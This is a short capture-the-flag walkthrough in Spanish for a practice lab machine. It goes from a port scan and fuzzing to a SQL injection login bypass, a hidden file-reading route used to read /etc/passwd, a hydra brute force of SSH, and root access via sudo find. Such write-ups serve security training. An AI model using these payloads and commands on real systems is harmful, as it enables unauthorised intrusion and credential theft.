PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos al puerto 80 y vemos una web marronera

-Hacemos fuzzing y encontramos la ruta login.php

-Bypasseamos el login con un simple --> 'or 1=1-- -

-Nos lleva a la página 'admin.php' , hacemos click en un enlace y nos lleva a --> /todo-list.php

-Nos dice que ha creado una ruta para leer archivos internos de la máquina bajo el nombre lee_archivos , codificado en base64:
	-echo 'lee_archivos' | base64
		bGVlX2FyY2hpdm9zCg==

-Nos vamos a IP/bGVlX2FyY2hpdm9zCg==.php y encontramos la ruta

-Leemos el /etc/passwd y encontramos el usuario 'superadministrator'

-Fuerza bruta con hydra a ssh:
	-hydra ssh://192.168.1.152 -l superadministrator -P /usr/share/wordlists/rockyou.txt -V
		-password: princesa

-Nos autenticamos por ssh con las credenciales:
	-ssh superadministrator@192.168.1.133
	-password: princesa
	superadministrator@thehackerslabs-bocatacalamares:~$

## Escalada de Privilegios

-sudo -l:
	(ALL) /usr/bin/find

-sudo /usr/bin/find . -exec /bin/sh -p \; -quit
	# whoami
	root
